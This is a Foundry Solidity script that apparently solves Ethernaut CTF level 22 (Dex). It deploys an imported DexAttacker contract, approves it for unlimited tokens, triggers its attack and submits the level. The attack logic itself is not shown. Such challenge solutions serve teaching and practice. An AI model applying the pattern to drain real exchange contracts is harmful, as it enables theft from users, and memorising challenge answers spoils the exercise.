// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

import {Script, console2} from "forge-std/Script.sol";
import {EthernautHelper} from "../setup/EthernautHelper.sol";

// NOTE You can import your helper contracts & create interfaces here
import "../../src/22-DexAttacker.sol";

contract DexSolution is Script, EthernautHelper {
    address constant LEVEL_ADDRESS = 0xB468f8e42AC0fAe675B56bc6FDa9C0563B61A52F;
    uint256 heroPrivateKey = vm.envUint("PRIVATE_KEY");

    function run() public {
        vm.startBroadcast(heroPrivateKey);
        // NOTE this is the address of your challenge contract
        // NOTE make sure to change original function into "_createInstance()" for the correct challengeInstance address.
        address challengeInstance = _createInstance(LEVEL_ADDRESS);

        // YOUR SOLUTION HERE
        DexAttacker dexAttacker = new DexAttacker(challengeInstance);
        IDex(challengeInstance).approve(address(dexAttacker), type(uint).max);
        dexAttacker.attack();

        // SUBMIT CHALLENGE. (DON'T EDIT)
        bool levelSuccess = submitInstance(challengeInstance);
        require(levelSuccess, "Challenge not passed yet");
        vm.stopBroadcast();

        console2.log(successMessage(22));
    }
}
